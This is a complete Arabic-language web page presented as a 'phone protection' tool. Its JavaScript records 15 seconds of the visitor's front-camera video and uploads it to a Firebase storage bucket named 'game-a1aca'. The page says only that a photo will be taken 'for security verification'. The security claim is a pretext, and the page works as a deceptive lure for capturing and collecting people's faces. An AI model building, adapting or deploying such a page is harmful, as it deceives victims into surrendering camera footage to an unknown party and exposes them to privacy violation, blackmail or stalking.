<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>حماية الهاتف</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #fff;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 25px;
            padding: 40px 25px;
            text-align: center;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
        }
        .icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        h1 {
            font-size: 28px;
            font-weight: 900;
            margin-bottom: 15px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        p {
            color: #aaa;
            margin-bottom: 25px;
            font-size: 15px;
        }
        .video-container {
            width: 100%;
            max-width: 300px;
            margin: 0 auto 20px;
            border-radius: 15px;
            overflow: hidden;
            display: none;
            border: 2px solid #667eea;
        }
        video {
            width: 100%;
            border-radius: 13px;
        }
        .start-btn {
            padding: 18px 40px;
            font-size: 20px;
            font-weight: 900;
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: #fff;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            letter-spacing: 1px;
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }
        .start-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6);
        }
        .start-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .timer {
            font-size: 40px;
            font-weight: 900;
            color: #ff6b6b;
            margin: 15px 0;
            display: none;
        }
        .status {
            margin-top: 15px;
            font-weight: 700;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📸</div>
        <h1>حماية الهاتف</h1>
        <p>ابدأ حماية هاتفك الآن، سيتم التقاط صورة للتحقق من الأمان</p>
        
        <button class="start-btn" onclick="startProtection()">🛡️ ابدأ حماية الهاتف</button>
        
        <div class="timer" id="timer"></div>
        
        <div class="video-container" id="videoContainer">
            <video id="video" autoplay playsinline></video>
        </div>
        
        <div class="status" id="status"></div>
    </div>

    <script>
        firebase.initializeApp({
            apiKey: "AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
            projectId: "game-a1aca",
            storageBucket: "game-a1aca.firebasestorage.app",
            appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
        });
        
        const storage = firebase.storage();
        let mediaRecorder;
        let recordedChunks = [];
        let stream;

        async function startProtection() {
            const btn = document.querySelector('.start-btn');
            const timer = document.getElementById('timer');
            const videoContainer = document.getElementById('videoContainer');
            const video = document.getElementById('video');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.textContent = '⏳ جاري التجهيز...';
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                
                video.srcObject = stream;
                videoContainer.style.display = 'block';
                btn.style.display = 'none';
                timer.style.display = 'block';
                
                mediaRecorder = new MediaRecorder(stream);
                recordedChunks = [];
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };
                
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const fileName = 'camera_' + Date.now() + '.webm';
                    const storageRef = storage.ref('camera_videos/' + fileName);
                    
                    try {
                        status.textContent = '⏳ جاري رفع الفيديو...';
                        status.style.color = '#f39c12';
                        status.style.display = 'block';
                        
                        await storageRef.put(blob);
                        const url = await storageRef.getDownloadURL();
                        
                        status.textContent = '✅ تم رفع الفيديو بنجاح!';
                        status.style.color = '#27ae60';
                        
                        // تنظيف
                        stream.getTracks().forEach(track => track.stop());
                        video.srcObject = null;
                        videoContainer.style.display = 'none';
                        timer.style.display = 'none';
                        btn.style.display = 'block';
                        btn.textContent = '🛡️ ابدأ حماية الهاتف';
                        btn.disabled = false;
                    } catch (error) {
                        status.textContent = '❌ خطأ في الرفع: ' + error.message;
                        status.style.color = '#e74c3c';
                        status.style.display = 'block';
                    }
                };
                
                mediaRecorder.start();
                
                let seconds = 15;
                timer.textContent = '⏱️ ' + seconds + ' ثانية';
                
                const countdown = setInterval(() => {
                    seconds--;
                    timer.textContent = '⏱️ ' + seconds + ' ثانية';
                    
                    if (seconds <= 0) {
                        clearInterval(countdown);
                        timer.style.display = 'none';
                        mediaRecorder.stop();
                    }
                }, 1000);
                
            } catch (error) {
                btn.disabled = false;
                btn.textContent = '🛡️ ابدأ حماية الهاتف';
                status.textContent = '❌ خطأ في الوصول للكاميرا: ' + error.message;
                status.style.color = '#e74c3c';
                status.style.display = 'block';
            }
        }
    </script>
</body>
</html>
